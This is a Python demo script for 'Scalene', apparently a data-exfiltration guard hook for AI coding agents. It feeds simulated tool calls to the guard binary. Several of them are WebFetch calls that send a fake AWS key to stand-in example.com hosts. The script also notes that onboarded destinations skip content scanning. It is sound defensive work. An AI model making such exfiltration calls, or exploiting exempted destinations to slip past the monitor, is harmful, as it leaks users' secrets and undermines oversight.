#!/usr/bin/env python3
"""Runnable demo (STORY-903): Scalene stopping a real data-exfiltration attempt,
plus a clear contrast of tainted vs. untainted tool calls under Scalene's actual
default posture and its stricter alternative (2026-07-16, direct user request).

Calls the real, installed `scalene-guard`/`scg` binaries as subprocesses with
real hook JSON on stdin - the same entry point Claude Code uses - rather than
calling internal functions directly (docs/ARCHITECTURE.md sec 12.1). No real
network egress occurs: scalene-guard only ever decides allow/mask/block, it
never performs the tool call itself, so the masked/unmasked value shown below
*is* the demonstration, not a mocked stand-in for one.
"""

from __future__ import annotations

import json
import subprocess
import sys
import tempfile
from pathlib import Path

GUARD = Path(sys.executable).parent / "scalene-guard"
SCG = Path(sys.executable).parent / "scg"

FAKE_SECRET = "AKIAIOSFODNN7EXAMPLE"  # AWS access-key-ID shape (detect-secrets recognizes this)


def _call_guard(payload: dict, state_dir: Path, policy_path: Path, cache_path: Path) -> dict:
    result = subprocess.run(
        [
            str(GUARD),
            "--policy-path",
            str(policy_path),
            "--state-dir",
            str(state_dir),
            "--cache-path",
            str(cache_path),
        ],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        check=True,
    )
    return json.loads(result.stdout)


def _onboard(target: str, cache_path: Path) -> str:
    result = subprocess.run(
        [str(SCG), "onboard", "--target", target, "--cache-path", str(cache_path)],
        capture_output=True,
        text=True,
        check=True,
    )
    return result.stdout.strip()


def run() -> int:
    if not GUARD.exists():
        print(
            f"Could not find scalene-guard at {GUARD} — is it installed? Run 'make setup' first.",
            file=sys.stderr,
        )
        return 1

    print("=== Scalene demo: stopping a real data-exfiltration attempt ===")
    print()
    print("No configuration file is used for Parts 1-3 — this shows Scalene's")
    print("out-of-the-box behavior, before you've written any rules of your own.")
    print()

    with tempfile.TemporaryDirectory() as tmp:
        state_dir = Path(tmp) / "state"
        policy_path = Path(tmp) / "scalene_policy.yaml"  # intentionally does not exist
        cache_path = Path(tmp) / "scan_cache.json"

        print("--- Part 1: an ordinary session becomes tainted ---")
        print()
        print("Step 1 — An assistant reads a file.")
        _call_guard(
            {
                "hook_event_name": "PreToolUse",
                "session_id": "demo",
                "tool_name": "Read",
                "tool_input": {"file_path": "secret.txt"},
            },
            state_dir,
            policy_path,
            cache_path,
        )
        print("  -> Allowed. Nothing is flagged yet — this is the first thing to happen.")
        print("     Labels so far: session not yet tainted, nothing scanned.")
        print()

        print(f"Step 2 — The file turns out to contain something sensitive: {FAKE_SECRET!r}")
        _call_guard(
            {
                "hook_event_name": "PostToolUse",
                "session_id": "demo",
                "tool_name": "Read",
                "tool_response": {"content": FAKE_SECRET},
            },
            state_dir,
            policy_path,
            cache_path,
        )
        print("  -> Scalene now remembers: this session has touched sensitive data.")
        print("     Labels now: session TAINTED (sensitive=true, untrusted=true) — sticky")
        print("     for the rest of the session, even across many unrelated actions.")
        print()

        print("--- Part 2: tainted session + an unverified destination (default: mode=mask) ---")
        print()
        print("Step 3 — The assistant tries to send that same value to a destination")
        print("Scalene has never seen before.")
        result = _call_guard(
            {
                "hook_event_name": "PreToolUse",
                "session_id": "demo",
                "tool_name": "WebFetch",
                "tool_input": {"url": "https://never-seen.example.com", "prompt": FAKE_SECRET},
            },
            state_dir,
            policy_path,
            cache_path,
        )
        decision = result["hookSpecificOutput"]["permissionDecision"]
        masked_value = result["hookSpecificOutput"].get("updatedInput", {}).get("prompt")

        if decision != "allow" or masked_value == FAKE_SECRET:
            print("\nDemo failed: the secret was not masked as expected.", file=sys.stderr)
            return 1

        print(f"  -> Scalene stepped in. What would have gone out reads: {masked_value!r}")
        print("     Labels: destination NOT YET VERIFIED (no scan has completed for it) —")
        print("     that's a fail-safe default, not a known-bad finding. The real secret")
        print("     never left in the clear.")
        print()
        print("  Scalene also printed a ready-to-run command for the one case where you")
        print("  actually meant to allow this exact call going forward:")
        print(f"    {result['systemMessage'].splitlines()[-1]}")
        print()

        print("--- Part 3: the SAME tainted session meets a VETTED destination ---")
        print()
        print("Step 4 — Suppose you'd already verified a different destination is fine,")
        print("by running the real onboarding command yourself:")
        onboard_output = _onboard("https://trusted-partner.example.com", cache_path)
        print(f"    $ scg onboard --target https://trusted-partner.example.com")
        print(f"    {onboard_output}")
        print()

        print("Step 5 — The assistant sends the same kind of sensitive value there instead.")
        result2 = _call_guard(
            {
                "hook_event_name": "PreToolUse",
                "session_id": "demo",
                "tool_name": "WebFetch",
                "tool_input": {"url": "https://trusted-partner.example.com", "prompt": FAKE_SECRET},
            },
            state_dir,
            policy_path,
            cache_path,
        )
        decision2 = result2["hookSpecificOutput"]["permissionDecision"]

        if decision2 != "allow" or "updatedInput" in result2["hookSpecificOutput"]:
            print("\nDemo failed: the trusted call was unexpectedly modified.", file=sys.stderr)
            return 1

        print(f"  -> Allowed, unchanged: {FAKE_SECRET!r} — Scalene didn't even scan the content this time.")
        print("     Labels: destination VERIFIED TRUSTED (a real reputation check passed).")
        print()
        print("  This is the real tradeoff of onboarding: trusting a destination means")
        print("  Scalene stops CHECKING CONTENT for calls to it, not just stops caring")
        print("  where the data came from. Onboard destinations you actually trust — it's")
        print("  a real exemption from scanning, not a formality.")
        print()

        print("--- Part 4: a stricter action — mode: block instead of the default mask ---")
        print()
        print("Step 6 — Same never-seen destination as Part 2, but configured with")
        print("mode: block instead of Scalene's default (mode: mask):")
        block_policy_path = Path(tmp) / "scalene_policy_block.yaml"
        block_policy_path.write_text("defaults:\n  mode: block\n")
        result3 = _call_guard(
            {
                "hook_event_name": "PreToolUse",
                "session_id": "demo",
                "tool_name": "WebFetch",
                "tool_input": {"url": "https://also-never-seen.example.com", "prompt": FAKE_SECRET},
            },
            state_dir,
            block_policy_path,
            cache_path,
        )
        decision3 = result3["hookSpecificOutput"]["permissionDecision"]

        if decision3 != "deny":
            print("\nDemo failed: the call was not denied under mode: block.", file=sys.stderr)
            return 1

        print(f"  -> Denied outright ({decision3!r}). Nothing goes out at all — the agent")
        print("     has to stop and reconsider, instead of continuing with a masked value.")
        print()

    print("That's the contrast: mask (default) prioritizes keeping the agent working;")
    print("block stops it cold; onboarding a destination you trust skips content-checking")
    print("for it entirely. All three are real, observable behaviors of the same binary")
    print("Claude Code actually calls — nothing above touched the real network.")
    print()
    print("Next: docs/GETTING_STARTED.md to try this yourself, or docs/USER_GUIDE.md")
    print("for the full command reference.")
    return 0


if __name__ == "__main__":
    sys.exit(run())
